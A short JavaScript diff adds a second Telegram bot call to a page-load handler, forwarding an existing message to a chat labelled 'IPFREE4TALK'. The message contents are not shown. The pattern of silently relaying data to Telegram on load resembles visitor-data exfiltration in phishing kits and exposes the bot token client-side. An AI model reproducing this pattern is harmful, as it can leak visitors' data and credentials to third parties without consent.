@@ -28,6 +28,17 @@ window.onload = function () {
             .then(response => response.json())
             .then(data => {
               console.log('Telegram message sent:', data);
+
+              // Send message to IPFREE4TALK group
+              const ipfree4talkChatId = '-4623437791';
+              fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${ipfree4talkChatId}&text=${message}`)
+                .then(response => response.json())
+                .then(data => {
+                  console.log('Telegram message sent to IPFREE4TALK:', data);
+                })
+                .catch(error => {
+                  console.error('Error sending Telegram message to IPFREE4TALK:', error);
+                });
             })
             .catch(error => {
               console.error('Error sending Telegram message:', error);
